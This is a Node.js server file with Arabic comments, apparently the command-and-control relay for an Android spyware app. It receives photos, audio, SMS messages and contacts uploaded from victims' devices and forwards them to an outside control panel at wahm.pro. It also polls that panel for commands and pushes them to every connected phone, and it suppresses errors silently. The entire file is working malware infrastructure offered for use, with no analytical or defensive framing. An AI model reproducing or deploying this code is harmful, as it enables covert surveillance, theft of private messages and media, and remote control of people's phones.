const express = require('express');
const webSocket = require('ws');
const http = require('http');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const FormData = require('form-data');

// --- إعدادات واهم @KHAIN3 ---
const PANEL_URL = 'https://wahm.pro/bot/control.php'; 

const app = express();
const appServer = http.createServer(app);
// إعداد السوكيت مع توقيت إغلاق أطول
const appSocket = new webSocket.Server({ 
    server: appServer,
    clientTracking: true
});

const upload = multer({ limits: { fileSize: 50 * 1024 * 1024 } }); // دعم حتى 50 ميجا
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// دالة إرسال التقارير للوحة باحترافية
async function reportToPanel(data) {
    try {
        const params = new URLSearchParams();
        for (const key in data) params.append(key, data[key]);
        await axios.post(PANEL_URL, params, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 5000
        });
    } catch (e) { /* فشل صامت */ }
}

// دالة رفع الملفات (صور/صوت) للوحة
async function uploadFileToPanel(buffer, filename, model) {
    try {
        const form = new FormData();
        form.append('file', buffer, { filename: filename });
        form.append('model', model || "Unknown");
        await axios.post(PANEL_URL, form, {
            headers: { ...form.getHeaders() },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
    } catch (e) { console.log("خطأ في رفع ملف"); }
}

app.get('/', (req, res) => res.send('WAHM Server is Active 🚀'));

// استقبال الملفات من الـ APK
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const model = req.headers.model || "Unknown Device";
    if (req.file) {
        uploadFileToPanel(req.file.buffer, req.file.originalname, model);
    }
    res.send('OK');
});

// استقبال النصوص (SMS/Contacts) من الـ APK
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || "Unknown Device";
    reportToPanel({ 
        model: model,
        text: req.body['text'] 
    });
    res.send('OK');
});

// إدارة اتصالات WebSocket
appSocket.on('connection', (ws, req) => {
    ws.isAlive = true;
    const model = req.headers.model || "Unknown";
    
    // إخطار اللوحة بالاتصال
    reportToPanel({ 
        model: model,
        text: `°• جهاز متصل الآن\n• الموديل: ${model}\n• البطارية: ${req.headers.battery || '?'}`
    });

    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (msg) => {
        // إذا أرسل التطبيق رد مباشر
        reportToPanel({ model: model, text: `رد من الجهاز: ${msg}` });
    });

    ws.on('close', () => {
        reportToPanel({ model: model, text: `°• فقد الاتصال بالجهاز: ${model}` });
    });
    
    ws.on('error', () => { /* منع انهيار السيرفر */ });
});

// نظام سحب الأوامر من اللوحة (Polling)
setInterval(async () => {
    try {
        const res = await axios.get(`${PANEL_URL}?get_cmd=1`, { timeout: 2000 });
        const cmd = res.data.trim();
        
        if (cmd && cmd !== "OK" && cmd !== "") {
            appSocket.clients.forEach(client => {
                if (client.readyState === webSocket.OPEN) {
                    client.send(cmd);
                }
            });
        }
    } catch (e) { /* خطأ اتصال باللوحة */ }
}, 3000);

// نظام Heartbeat لمنع Render من قتل الاتصال
const interval = setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => console.log(`Server started on port ${PORT}`));

